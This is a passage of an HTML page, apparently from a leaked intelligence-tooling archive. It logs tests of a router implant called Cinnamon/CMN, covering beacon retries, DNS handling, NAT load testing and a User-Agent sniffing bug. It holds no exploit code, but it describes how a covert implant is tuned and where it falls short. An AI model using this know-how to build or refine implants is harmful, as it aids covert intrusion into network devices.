<li>Verfied the <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> reply going to impersonated host.  <span class="user">User #76523</span>/CMN determined this was due to <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> listener timeout on <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> too short to catch replies where recursive <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server waited for an answer from authoritative server.</li>
</ol>
</li>
<li>CMN 5.0.3 test - Verify fix to bug identified in test 47<ol><li>Received 5.0.3 from <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> on 9/3/15 and verified that <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> is now picking up <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> replies in the case where the <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server waited for timeout before sending reply.<ol>
<li>Reloaded to start with a clean device</li>
<li>Commented out about half of the PROBE DEST domains from <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span> <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server and reloaded 4.4.4.4 dns server to clear cache</li>
<li>Installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> 5.0.3</li>
<li>Ran tcpdump on 4.4.4.4 server and wireshark on impersonated Seeds host to verify <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> traffic</li>
<li>Triggered <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> multiple tmes and observed both successful and unsuccessful active internet detection steps on the tcpdump - did not see any <span class="glossary">ICMP<span class="glossary-tt">Internet Control Message Protocol</span></span> uneachable admin prohibited messages on 4.4.4.4 server and did not log any packets in the wireshark on the impersonated seeds host.</li>
</ol>
</li></ol>
</li>
<li>Verify beacon failure retries<ol>
<li>With <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> 5.0.3 installed, set beacon retries to 2 - observed expected number of syn packets</li>
<li>Increased beacon retires to 4 and reinstalled <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - observed correct number of beacon packets, and also observed that the max beacon failures was reached</li>
</ol>
</li>
<li>Verify PAT issue fix in 5.0.3<ol>
<li>Reloaded 881 Bottom to start with a clean device</li>
<li>Installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> 5.0.3 norb with 1 beacon retry, 10 max beacons</li>
<li>Rebuilt and uploaded both modules to DUT</li>
<li><p>[Modules]<br>Active Modules: 6<br>Module Version<br>0 5.0.3<br>1 5.0.3<br>2 5.0.3<br>3 5.0.0<br>4 5.0.3<br>5 5.0.0</p></li>
<li>Started IXIA test up and let it run for 5 minutes at 1M</li>
<li>Was able to successfully beacon afterward 10 times.</li>
<li>Reloaded device</li>
<li>Ran five minute IXIA test, then installed CMN</li>
<li>Was able to successfully beacon 10 times.</li>
<li>Ran 20 minute IXIA test - was able to successfully beacon both during and after test</li>
<li>Beacons during IXIA traffic with about 104k active nat translations and 10M of traffic come in slowly, but they are successful</li>
</ol>
</li>
<li>Verify Bug 497 (Null pointer dereference when "Host:" string not present in User Agent sniffed by Cinnamon)<ol>
<li>Bakery provided python files to test, the cases are:<ol>
<li>test1.py - send User-Agent without Host: field present</li>
<li>test2.py - send User-Agent in two packets</li>
<li>test3.py - send User-Agent that is missing end of header sequence ("\r\n\r\n")</li>
<li>test4.py - <span class="user">User #76524</span> wrote; use headers from Chrome and make UA string over 1024 bytes long to test Cinnamon size constraints</li>
</ol>
</li>
<li>None of the test cases result in Cinnamon detecting traffic and beaconing.  I would expect test2.py to work, but the mitigation Bakery implemented is to ignore the packets.  <strong>**Should check on Bugzilla ticket to fix this in future release</strong>
</li>
<li>Tested large <span class="glossary">HTTP<span class="glossary-tt">Hypertext Transfer Protocol</span></span> Header - the max supported by Cinnamon is 1024 bytes.  Using test4.py, Cinnamon won't beacon. Web servers will accept between 4KB and 16KB size headers. <strong>**Limitation**</strong>
</li>
<li>Using these test cases, and then using wget traffic results in Cinnamon beaconing</li>
<li>Let 881 sit overnight.  Sent trigger, no beacon received.  Sent test4.py traffic.  Triggered, and then beaconed.  Looks like Cinnamon will use it for passive internet detection, but not save GET headers if they're too large.  Using saved headers from last wget it sniffed.  <strong>Is this desireable?</strong>
</li>
</ol>
</li>
<li>IXIA testing with 5.0.3 - re-test of PAT bug fix now that IXIA connections have been fixed<ol>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> to start with clean device</li>
<li>Kicked off IXIA traffic at 5M for 10 minutes to generate ip nat translations</li>
<li>Installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - nat tx at 38k when <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> installed</li>
<li>Attempted to beacon - rcvd inital beacon and 20 subsequent beacon attempts, while 38k tx active</li>
</ol>
</li>
<li>Testing Debian 8<ol>
<li>Built new Cinnamon-ICON3 VM, Debian 8.1 - 172.20.12.33</li>
<li>Installed <span class="glossary">IAC<span class="glossary-tt">International Access Code</span></span> 4.1</li>
</ol>
</li>
</ol>
<hr>
<h3>Attachments:</h3>
<ul>
<li>
<p><a href="files/CPU-before-and-after-CMN.png">CPU-before-and-after-CMN.png</a></p>
</li>
<li>
<p><a href="files/image2015-8-6&#32;10:19:34.png">image2015-8-6 10:19:34.png</a></p>
</li>
<li>
<p><a href="files/CPU-22hour-WITH-CMN-AND-REDIR.png">CPU-22hour-WITH-CMN-AND-REDIR.png</a></p>
</li>
<li>
<p><a href="files/image2015-7-27&#32;9:48:31.png">image2015-7-27 9:48:31.png</a></p>
</li>
<li>
<p><a href="files/image2015-7-24&#32;14:47:52.png">image2015-7-24 14:47:52.png</a></p>
</li>
<li>
<p><a href="files/image2015-7-24&#32;13:55:31.png">image2015-7-24 13:55:31.png</a></p>
</li>
<li>
<p><a href="files/image2015-7-24&#32;12:38:35.png">image2015-7-24 12:38:35.png</a></p>
</li>
</ul>
<hr>
<h3>Previous versions:</h3>
<p>| <a href="page_17760540.html">1</a> <span class="pg-tag"><i>empty</i></span>
| <a href="page_17760578.html">2</a> <span class="pg-tag"></span>
| <a href="page_17760581.html">3</a> <span class="pg-tag"></span>
| <a href="page_17760583.html">4</a> <span class="pg-tag"></span>
| <a href="page_17760585.html">5</a> <span class="pg-tag"></span>
| <a href="page_17760587.html">6</a> <span class="pg-tag"></span>
| <a href="page_17760589.html">7</a> <span class="pg-tag"></span>
| <a href="page_17760601.html">8</a> <span class="pg-tag"></span>
| <a href="page_17760603.html">9</a> <span class="pg-tag"></span>
| <a href="page_17760605.html">10</a> <span class="pg-tag"></span>
| <a href="page_17760609.html">11</a> <span class="pg-tag"></span>
| <a href="page_17760621.html">12</a> <span class="pg-tag"></span>
| <a href="page_17760623.html">13</a> <span class="pg-tag"></span>
| <a href="page_17760628.html">14</a> <span class="pg-tag"></span>
| <a href="page_17760630.html">15</a> <span class="pg-tag"></span>
| <a href="page_17760633.html">16</a> <span class="pg-tag"></span>
| <a href="page_17760635.html">17</a> <span class="pg-tag"></span>
| <a href="page_17760637.html">18</a> <span class="pg-tag"></span>
| <a href="page_17760639.html">19</a> <span class="pg-tag"></span>
| <a href="page_17760647.html">20</a> <span class="pg-tag"></span>
| <a href="page_17760649.html">21</a> <span class="pg-tag"></span>
| <a href="page_17760654.html">22</a> <span class="pg-tag"></span>
| <a href="page_17760656.html">23</a> <span class="pg-tag"></span>
| <a href="page_17760662.html">24</a> <span class="pg-tag"></span>
| <a href="page_17760664.html">25</a> <span class="pg-tag"></span>
| <a href="page_17760666.html">26</a> <span class="pg-tag"></span>
| <a href="page_17760668.html">27</a> <span class="pg-tag"></span>
| <a href="page_17760670.html">28</a> <span class="pg-tag"></span>
| <a href="page_17760684.html">29</a> <span class="pg-tag"></span>
| <a href="page_17760717.html">30</a> <span class="pg-tag"></span>
| <a href="page_17760719.html">31</a> <span class="pg-tag"></span>
| <a href="page_18382856.html">32</a> <span class="pg-tag"></span>
| <a href="page_18382859.html">33</a> <span class="pg-tag"></span>
| <a href="page_18382878.html">34</a> <span class="pg-tag"></span>
| <a href="page_18382879.html">35</a> <span class="pg-tag"></span>
| <a href="page_18382881.html">36</a> <span class="pg-tag"></span>
| <a href="page_18382892.html">37</a> <span class="pg-tag"></span>
| <a href="page_18382903.html">38</a> <span class="pg-tag"></span>
| <a href="page_18382906.html">39</a> <span class="pg-tag"></span>
| <a href="page_18382909.html">40</a> <span class="pg-tag"></span>
| <a href="page_18382937.html">41</a> <span class="pg-tag"></span>
| <a href="page_18382974.html">42</a> <span class="pg-tag"></span>
| <a href="page_18382982.html">43</a> <span class="pg-tag"></span>
| <a href="page_18382983.html">44</a> <span class="pg-tag"></span>
| <a href="page_18382987.html">45</a> <span class="pg-tag"></span>
| <a href="page_18382990.html">46</a> <span class="pg-tag"></span>
| <a href="page_18383011.html">47</a> <span class="pg-tag"></span>
| <a href="page_18383017.html">48</a> <span class="pg-tag"></span>
| <a href="page_18383019.html">49</a> <span class="pg-tag"></span>
| <a href="page_18383023.html">50</a> <span class="pg-tag"></span>
| <a href="page_18383053.html">51</a> <span class="pg-tag"></span>
| <a href="page_18383055.html">52</a> <span class="pg-tag"></span>
| <a href="page_18383065.html">53</a> <span class="pg-tag"></span>
| <a href="page_18383069.html">54</a> <span class="pg-tag"></span>
| <a href="page_19070983.html">55</a> <span class="pg-tag"></span>
| <a href="page_19365901.html">56</a> <span class="pg-tag"></span>
| <a href="page_19365910.html">57</a> <span class="pg-tag"></span>
| <a href="page_19660803.html">58</a> <span class="pg-tag"></span>
| <a href="page_19660806.html">59</a> <span class="pg-tag"></span>
| <a href="page_19660860.html">60</a> <span class="pg-tag"></span>
| <a href="page_20250649.html">61</a> <span class="pg-tag"></span>
| <a href="page_20250651.html">62</a> <span class="pg-tag"></span>
| <a href="page_20250686.html">63</a> <span class="pg-tag"></span>
| <a href="page_20250696.html">64</a> <span class="pg-tag"></span>
| <a href="page_20250700.html">65</a> <span class="pg-tag"></span>
| <a href="page_20250704.html">66</a> <span class="pg-tag"></span>
| <a href="page_20250733.html">67</a> <span class="pg-tag"></span>
| <a href="page_20250738.html">68</a> <span class="pg-tag"></span>
| <a href="page_20250782.html">69</a> <span class="pg-tag"></span>
| <a href="page_20250788.html">70</a> <span class="pg-tag"></span>
| <a href="page_20250790.html">71</a> <span class="pg-tag"></span>
| <a href="page_20250792.html">72</a> <span class="pg-tag"></span>
| <a href="page_20250842.html">73</a> <span class="pg-tag"></span>
| <a href="page_20250892.html">74</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20250900.html">75</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251142.html">76</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251144.html">77</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251146.html">78</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251189.html">79</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251192.html">80</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251195.html">81</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251197.html">82</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251199.html">83</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251206.html">84</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251217.html">85</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251220.html">86</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251234.html">87</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251236.html">88</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251239.html">89</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20251256.html">90</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873217.html">91</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873219.html">92</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873233.html">93</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873296.html">94</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873317.html">95</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873322.html">96</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873407.html">97</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873424.html">98</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873425.html">99</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873427.html">100</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873490.html">101</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873491.html">102</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873512.html">103</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873542.html">104</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873544.html">105</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873586.html">106</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873592.html">107</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873613.html">108</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_20873615.html">109</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_21561352.html">110</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_21561354.html">111</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_21561355.html">112</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_21561358.html">113</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_21561361.html">114</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_21561363.html">115</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_21561364.html">116</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_21561400.html">117</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_21561416.html">118</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_21561423.html">119</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_21725201.html">120</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_22052879.html">121</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_22052956.html">122</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_22052979.html">123</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_22052983.html">124</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_22642777.html">125</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_22642779.html">126</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_23134251.html">127</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_23134271.html">128</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_23134291.html">129</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_23134314.html">130</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_23134315.html">131</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_23134317.html">132</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_23134319.html">133</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_23134321.html">134</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_23134323.html">135</a> <span class="pg-tag">[Xetron]</span>
| <a href="page_23134377.html">136</a> <span class="pg-tag">[Xetron]</span>
|</p>
                    </div>
                </div>
            </div>

            <script type="text/javascript" src="../../highlighter/mootools-core-and-more.js"></script>
            <script type="text/javascript" src="../../highlighter/efatmarker.min.js"></script>
            <div id="efm-button">
            <div id="efm-menu">
                <h3 style="margin:0 0 2px 0">e-Highlighter</h3>
                <a id="efm-permalink" class="efm-need-highlight" href="page_17760464.html" style="margin-bottom:0;padding-bottom:0;"></a>
                <p style="margin-top:0;padding-top:0" class="efm-need-highlight">Click to send permalink to address bar, or right-click to copy permalink.</p>
                <p style="margin:0.5em 0;padding:0;border-top:1px dotted #ccc;height:1px"></p>
                <a id="efm-unhighlightall" class="efm-need-highlight">Un-highlight all</a>
                <a id="efm-unhighlight">Un-highlight selection<span>u</span></a>
                <a id="efm-highlight">Highlight selection<span>h</span></a>
                </div>
            </div>
            <script type="text/javascript">

            (function(){
            window.addEvent('domready', function(){

                var markerButton = $('efm-button');
                if ( markerButton ) {
                    eMarker = new EFatMarker($('uniquer'));
                    eMarker.tokenToSpans(); // apply whatever token is there
                    // need to act on mousedown or else selection disappear
                    markerButton.addEvent('mousedown', function(){
                        eMarker.interpretSelection(true);
                        return false;
                    });
                    $('efm-unhighlightall').addEvent('mousedown', function(){
                        eMarker.unhighlightAll(true);
                        return false;
                        });
                    $('efm-unhighlight').addEvent('mousedown', function(){
                        eMarker.unhighlightSelection(true);
                        return false;
                        });
                    $('efm-highlight').addEvent('mousedown', function(){
                        eMarker.highlightSelection(true);
                        return false;
                        });
                    $('efm-permalink').addEvent('mousedown', function(){
                        window.location.href = this.href;
                        return false;
                        });
                    // if Mootools Keyboard is available, use it
                    if (Keyboard) {
                        var keyboard = new Keyboard({
                            defaultEventType: 'keyup',
                            events: {
                                'h': function(){
                                    eMarker.highlightSelection(true);
                                    },
                                'u': function(){
                                    eMarker.unhighlightSelection(true);
                                    }
                                }
                            });
                        keyboard.activate();
                        }
                    eMarker.syncDOM();
                    // auto scroll to first highlight, if any
                    if (eMarker.hasSpans()) {
                        var scroll = new Fx.Scroll(window,{offset:{'x':0,'y':-100}}),
                            highlights = $$('#uniquer .efm-hi');
                        if (highlights.length > 0) {
                            scroll.toElement(highlights[0]);
                            }
                        }
                    }
                });
            })();
            </script>
            

<link href="../../static/css/styles_footer.css" rel="stylesheet">
<footer id="page-footer" class="footer-recommendations">
  <div class="footer-wrapper">
    <div class="recommendation-container">
      <a href="page_17760464.html#" class="top">Top</a>
      
        <ul class="recommendation-links">
          
            <li class="recommendation">
              <a href="https://www.torproject.org/" target="_blank">
                <div class="teaser"><img class="spip_logos" alt="" src="../../IMG/arton401.png?1461924517" width="300" height="180" /></div>
                <p>
<p>Tor is an encrypted anonymising network that makes it harder to intercept internet communications, or see where communications are coming from or going to.</p>
</p>
              </a>
            </li>
          
            <li class="recommendation">
              <a href="https://tails.boum.org/" target="_blank">
                <div class="teaser"><img class="spip_logos" alt="" src="../../IMG/arton405.png?1461924517" width="446" height="223" /></div>
                <p>
<p>Tails is a live operating system, that you can start on almost any computer from a DVD, USB stick, or SD card. It aims at preserving your privacy and anonymity.</p>
</p>
              </a>
            </li>
          
            <li class="recommendation">
              <a href="https://www.couragefound.org/" target="_blank">
                <div class="teaser"><img class="spip_logos" alt="" src="../../IMG/arton404.png?1461924517" width="357" height="50" /></div>
                <p>
<p>The Courage Foundation is an international organisation that supports those who risk life or liberty to make significant contributions to the historical record.</p>
</p>
              </a>
            </li>
          
            <li class="recommendation">
              <a href="https://www.bitcoin.org/" target="_blank">
                <div class="teaser"><img class="spip_logos" alt="" src="../../IMG/arton403.png?1461924517" width="300" height="64" /></div>
                <p>
<p>Bitcoin uses peer-to-peer technology to operate with no central authority or banks; managing transactions and the issuing of bitcoins is carried out collectively by the network.</p>
</p>
              </a>
            </li>
          
        </ul>
      
      <ul class="social-links">
        <li>
          <a href="https://www.facebook.com/wikileaks" target="_blank" alt="Facebook">
            <img src="../../static/img/fb-logo.png" alt="Facebook" title="Facebook page" />
          </a>
        </li>
        <li>
          <a href="https://twitter.com/wikileaks" target="_blank" alt="Twitter">
            <img src="../../static/img/twitter-logo.png" alt="Twitter" title="Twitter page" />
          </a>
        </li>
      </ul>
    </div>
  </div>
</footer>

        </div>

        <script src="../../bootstrap/js/jquery.min.js"></script>
        <script type="text/javascript">
        var $j = jQuery.noConflict();
        </script>
        <script src="../../bootstrap/js/bootstrap.min.js"></script>
    </body>
</html>
